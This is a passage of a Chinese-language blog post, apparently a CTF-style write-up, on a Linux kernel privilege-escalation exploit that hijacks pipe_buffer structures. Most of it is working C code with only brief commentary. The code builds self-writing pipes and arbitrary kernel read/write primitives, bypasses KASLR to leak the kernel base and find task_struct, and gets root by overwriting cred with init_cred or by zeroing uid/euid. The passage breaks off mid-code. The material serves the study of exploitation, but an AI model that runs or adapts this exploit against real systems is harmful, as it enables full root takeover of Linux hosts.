class="comment">/* try to rehit victim page by reallocating pipe_buffer */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let a pipe-&gt;bufs pointing to itself */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">    evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">    evil_pipe_buf.private = info_pipe_buf.private;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_2nd_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, </span><br><span class="line">                    self_2nd_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_2nd_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite the 3rd pipe_buffer to this page too */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid</span><br><span class="line">            || i == self_2nd_pipe_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_3rd_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_3rd_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite the 4th pipe_buffer to this page too */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid</span><br><span class="line">            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_4th_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_4th_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="任意读写"><a href="#任意读写" class="headerlink" title="任意读写"></a>任意读写</h3><p>之前已经介绍了ABC的作用,以下就是初始化准备过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setup_evil_pipe</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* init the initial val for 2nd,3rd and 4th pipe, for recovering only */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0xff0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe pointing to 4th */</span></span><br><span class="line">    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">    evil_3rd_buf.len = <span class="number">0</span>;</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_4th_buf.len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真正的任意读写封装</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_read_by_pipe</span><span class="params">(<span class="keyword">struct</span> page *page_to_read, <span class="type">void</span> *dst)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* page to read */</span></span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0x1ff8</span>;</span><br><span class="line">    evil_2nd_buf.page = page_to_read;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read out data */</span></span><br><span class="line">    read(pipe_fd[self_2nd_pipe_pid][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_write_by_pipe</span><span class="params">(<span class="keyword">struct</span> page *page_to_write, <span class="type">void</span> *src, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* page to write */</span></span><br><span class="line">    evil_2nd_buf.page = page_to_write;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* write data into dst page */</span></span><br><span class="line">    write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="泄露信息"><a href="#泄露信息" class="headerlink" title="泄露信息"></a>泄露信息</h3><p>我们现在已经拥有了任意读写的能力</p><p>泄露kernel text</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * KASLR&#x27;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,</span></span><br><span class="line"><span class="comment"> * so we can simply get the vmemmap_base like this in a SMALL-MEM env.</span></span><br><span class="line"><span class="comment"> * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,</span></span><br><span class="line"><span class="comment"> * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.</span></span><br><span class="line"><span class="comment"> * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vmemmap_base = (<span class="type">size_t</span>) info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (buf[<span class="number">0</span>] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="number">0</span>] &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>)) &#123;</span><br><span class="line">        kernel_base = buf[<span class="number">0</span>] -  <span class="number">0x070</span>;</span><br><span class="line">        kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span></span><br><span class="line">               <span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, </span><br><span class="line">               kernel_base, kernel_offset);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);</span><br></pre></td></tr></table></figure><p>0x9d000/0x1000=157</p><p>至于开头那段注释,可能是我理解能力不够强,按照我的理解似乎是有点问题的</p><p><code>arttnba3</code>大佬提到kaslr的粒度是256m,但是<code>and pages of size 0x1000000 is 1GB MEM</code>中的<code>0x1000000</code>显然不是256m,之后的代码以及<code>just vmemmap_base -= 256MB</code>与之都对不上</p><p>所以个人觉得应该是<code>artnba3</code>大佬写错了,按照这个思路其实只有当<code>MEM &gt; 16GB</code>时才有必要利用这个循环</p><hr><p>之后再在内存中搜索task结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwnn&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For a machine with MEM less than 256M, we can simply get the:</span></span><br><span class="line"><span class="comment"> *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;</span></span><br><span class="line"><span class="comment"> * But that&#x27;s not always accurate, espacially on a machine with MEM &gt; 256M.</span></span><br><span class="line"><span class="comment"> * So we need to find another way to calculate the page_offset_base.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Luckily the task_struct::ptraced points to itself, so we can get the</span></span><br><span class="line"><span class="comment"> * page_offset_base by vmmemap and current task_struct as we know the page.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Note that the offset of different filed should be referred to your env.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++) &#123;</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (vmemmap_base + i * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    comm_addr = memmem(buf, <span class="number">0xf00</span>, <span class="string">&quot;arttnba3pwnn&quot;</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;real_cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>)) &#123;  <span class="comment">/* task-&gt;parent */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">        parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* task_struct::ptraced */</span></span><br><span class="line">        current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">        page_offset_base = (comm_addr[<span class="number">-50</span>]&amp;<span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;<span class="comment">//直接映射区的首页</span></span><br><span class="line">        page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">               (<span class="keyword">struct</span> page*) (vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">               page_offset_base);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">               <span class="string">&quot;0x%lx\n\n&quot;</span>, current_task);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>arttnba3</code>师傅提供了三种提权的方法,其中有两种并不常见</p><p>我们一一解读一下</p><h3 id="修改cred"><a href="#修改cred" class="headerlink" title="修改cred"></a>修改cred</h3><p>第一种是较为常见的修改当前进程的task_struct结构体,一般两种形式</p><ul><li>修改<code>task_struct-&gt;cred</code>为<code>&amp;init_cred</code></li><li>修改<code>task_struct-&gt;cred-&gt;uid和euid</code>为<code>0</code></li></ul><p>arttnba3大佬选择的是第一种方法</p><p>由于 <code>init_cred</code> 的符号有的时候是不在 <code>/proc/kallsyms</code> 中导出的(当然这题是导出了的)</p><p>所以大佬展示了一种方法,即通过解析 <code>task_struct</code> 不停的向上寻找父进程,直到找到<code>init</code>进程,<code>init</code>是所有进程的父进程,且其拥有<code>root</code>权限,当然cred就是<code>init_cred</code></p><p>将其保存并用以替换current_task的cred,以此提权</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_task_overwrite</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* finding the init_task, the final parent of every task */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);</span><br><span class="line"></span><br><span class="line">        tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) ptask_page_addr, buf);</span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (ptask_page_addr+<span class="number">0x40</span>),&amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">        <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>]) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    init_task = parent_task;</span><br><span class="line">    init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">    init_nsproxy = tsk_buf[<span class="number">377</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">    tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>),</span><br><span class="line">                            &amp;buf[<span class="number">512</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后个人自己实现了一下第二种方法,直接修改uid和euid为0,思路更直接</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llu\n&quot;</span>,cred_page);</span><br><span class="line"><span class="type">int</span> offset=cred_page&amp;<span class="number">0xfff</span>;</span><br><span class="line">   cred_page=direct_map_addr_to_page_addr(cred_page);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* page to write */</span></span><br><span class="line">   evil_2nd_buf.page = cred_page;</span><br><span class="line">   evil_2nd_buf.offset = offset+<span class="number">4</span>;</span><br><span class="line">   evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> src[<span class="number">24</span>];</span><br><span class="line"><span class="built_in">memset</span>(src,<span class="number">0</span>,<span class="number">24</span>);</span><br><span class="line"><span class="type">int</span> len=<span class="number">24</span>;</span><br><span class="line">   <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">   